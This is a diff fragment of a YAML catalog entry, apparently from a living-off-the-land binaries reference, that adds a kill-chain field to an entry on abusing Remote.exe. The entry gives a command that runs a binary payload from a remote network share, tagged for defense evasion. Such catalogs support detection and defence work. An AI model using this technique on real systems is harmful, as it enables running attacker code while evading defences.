@@ -20,6 +20,7 @@
       - N/A
 - command: Remote.exe /s "\\10.10.10.30\binaries\file.exe" [ANY ARGUMENTS/COMMANDS]
   description: Abuse remote.exe to launch an arbitrary remotely-hosted binary payload.
+  killchain:
     - Actions on Objectives
   mitre:
     Defense Evasion:
